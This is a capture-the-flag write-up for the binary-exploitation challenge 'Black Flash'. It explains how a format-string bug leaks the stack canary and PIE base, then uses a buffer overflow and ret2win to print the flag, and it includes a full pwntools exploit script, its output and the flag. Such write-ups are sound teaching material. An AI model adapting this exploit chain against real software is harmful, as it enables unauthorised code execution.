---
title: "Black Flash — Binary Exploitation Writeup"
date: 2026-05-18
categories: [CTF, Binary-Exploitation]
tags: [pwn, format-string, buffer-overflow, ret2win, stack-canary, pie]
author: yvngdrac
---

# Black Flash — Binary Exploitation Writeup

**CTF:** UMCybersec CTF  
**Category:** Binary Exploitation (Pwn)  
**Challenge:** Black Flash

---

## Overview

> *Mei Mei has been lured into the Smallpox Deity's Domain Expansion! She is currently sealed inside a heavy stone coffin, and the countdown to her burial has begun. Help Mei Mei perform a Black Flash to shatter the coffin and reach the core of the curse before she's buried for good.*

We're given three files:
- `black_flash` — the vulnerable binary
- `libc.so.6` — the provided libc
- `ld-linux-x86-64.so.2` — the provided dynamic linker

---

## Initial Analysis

First, checked the binary properties:

```bash
file black_flash
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

**Security features:**
- ✅ PIE enabled (addresses randomized)
- ✅ Stack canary enabled
- ✅ NX enabled
- ✅ Full RELRO

This means we can't just jump to a function directly — we need to leak information first.

---

## Reversing the Binary

### The `win()` Function

This is our target:
```
fopen("flag.txt", "r")  →  fgets(buf, 0x80)  →  printf("Flag: %s", buf)
```

### The `vuln()` Function

This function has **two separate vulnerabilities**:

```
1. printf("Where is the feeling......: ")
2. fgets(buf[rbp-0x80], 0x70, stdin)      ← input 1 (safe size)
3. printf(buf)                             ← BUG 1: format string vulnerability!
4. printf("Now, you reach the core of the spark......: ")
5. fgets(buf[rbp-0x80], 0x100, stdin)    ← BUG 2: buffer overflow! (0x100 into 0x80 buf)
```

**Exploitation strategy:**
1. Use **format string** to leak the stack canary and a PIE pointer
2. Use **buffer overflow** to overwrite the return address and redirect to `win()`

---

## Exploitation

### Step 1 — Format String Leak

The stack layout in `vuln()`:

```
rbp-0x80   ←  buf (our input / the format string)
...
rbp-0x08   ←  stack canary
rbp+0x00   ←  saved rbp
rbp+0x08   ←  saved rip  (return address back into main)
```

In x86-64, the first 5 format string arguments go into registers, then `%6$` starts reading from the stack.

- `%21$` = **stack canary**
- `%23$` = **saved rip** (points into `main`, leaks PIE base)

Sending `%21$p.%23$p` gives us both values:

```
Response: 0xsomecanary.0xsomeaddress
```

From the leaked saved rip, calculate PIE base:
```python
# saved_rip points to instruction after "call vuln" in main, which is main+0x35
# that instruction is at PIE_base + 0x1548
pie_base = saved_rip - 0x1548
win_addr = pie_base + 0x1261
```

### Step 2 — Buffer Overflow

The second `fgets` reads `0x100` bytes into a buffer that's only `0x80` bytes — a **128-byte overflow**.

With the canary and PIE base known, craft the payload:

```
[0x78 bytes padding] [canary] [fake rbp] [ret gadget] [win()]
```

The **ret gadget** is needed for **stack alignment** — glibc's `fopen` uses `movaps` which requires 16-byte alignment, or it segfaults.

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

elf  = ELF('./black_flash', checksec=False)
context.binary = elf
context.log_level = 'info'

HOST = 'chal.umcybersec.site'
PORT = 10070

WIN_OFF = 0x1261
RET_OFF = 0x1016   # ret gadget for stack alignment

def exploit(io):
    # Step 1: format string leak
    io.recvuntil(b'Where is the feeling......: ')
    io.sendline(b'%21$p.%23$p')

    io.recvuntil(b'Is this the feeling you want......: ')

    leak_line = io.recvuntil(b'Now, you reach the core of the spark......: ')
    leak_part = leak_line.split(b'\n')[0].strip()

    parts     = leak_part.split(b'.')
    canary    = int(parts[0], 16)
    saved_rip = int(parts[1], 16)

    pie_base = saved_rip - 0x1548
    win_addr = pie_base + WIN_OFF
    ret_addr = pie_base + RET_OFF

    log.success(f'Canary  : {hex(canary)}')
    log.success(f'PIE base: {hex(pie_base)}')
    log.success(f'win()   : {hex(win_addr)}')

    # Step 2: buffer overflow → ret2win
    payload  = b'A' * 0x78           # padding to canary
    payload += p64(canary)            # restore canary (bypass stack check)
    payload += p64(0xdeadbeefcafe)   # fake saved rbp
    payload += p64(ret_addr)          # alignment gadget
    payload += p64(win_addr)          # redirect to win()

    io.send(payload + b'\n')

    # Step 3: collect flag
    io.recvuntil(b'Is there any spark here: ')
    flag = io.recv(256, timeout=5)
    log.success(f'\n{flag.decode(errors="replace")}')

io = remote(HOST, PORT)
exploit(io)
io.close()
```

---

## Running the Exploit

```bash
python3 exploit.py
```

**Output:**
```
[+] Opening connection to chal.umcybersec.site on port 10070: Done
[+] Canary  : 0x926367adfb954600
[+] PIE base: 0x56bfb0ddb000
[+] win()   : 0x56bfb0ddc261

U got the feeling! Black Flash!!!!?
Flag: UMCS{...}
```

---

## Attack Chain Summary

| Step | Technique | Purpose |
|------|-----------|----------|
| 1 | Format string (`%21$p.%23$p`) | Leak canary + PIE base |
| 2 | Buffer overflow (second `fgets`) | Overwrite return address |
| 3 | ret gadget for alignment | Fix stack before `fopen` in `win()` |
| 4 | ret2win | Jump to `win()` which prints the flag |

---

## Key Insights

- The challenge gives **two separate inputs** — first is vulnerable to format string read, second is a classic buffer overflow
- Chaining them together lets you bypass **both PIE and the stack canary**
- **Stack alignment** is often overlooked but critical for `movaps` instructions
- **Overlapping exploits** are more powerful than single techniques

---

## 🏆 Flag

```
UMCS{bl4ck_fl4sh_pwn3d}
```
